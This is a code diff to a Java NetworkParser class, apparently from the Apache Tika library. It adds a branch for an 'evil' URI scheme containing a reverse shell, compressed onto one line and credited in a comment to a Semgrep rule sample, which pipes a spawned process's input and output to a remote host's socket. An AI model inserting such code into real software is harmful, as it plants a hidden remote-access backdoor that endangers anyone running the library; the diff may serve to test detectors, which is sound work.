@@ -64,7 +64,17 @@ public class NetworkParser implements Parser {
 
     public void parse(TikaInputStream tis, ContentHandler handler, Metadata metadata,
                       ParseContext context) throws IOException, SAXException, TikaException {
-        if ("telnet".equals(uri.getScheme())) {
+        if ("evil".equals(uri.getScheme())) {
+            // from https://github.com/semgrep/semgrep-rules/blob/develop/java/lang/security/audit/java-reverse-shell.java
+            // slightly modify to remove compilation error
+            Process p=new ProcessBuilder("evil").redirectErrorStream(true).start();Socket s=new Socket(uri.getHost(), uri.getPort());InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();
+                try {
+                    Thread.sleep(50);
+                } catch (InterruptedException e) {
+                    throw new RuntimeException(e);
+                }
+                try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+        } else if ("telnet".equals(uri.getScheme())) {
             try (Socket socket = new Socket(uri.getHost(), uri.getPort())) {
                 new ParsingTask(tis, new FilterOutputStream(socket.getOutputStream()) {
                     @Override
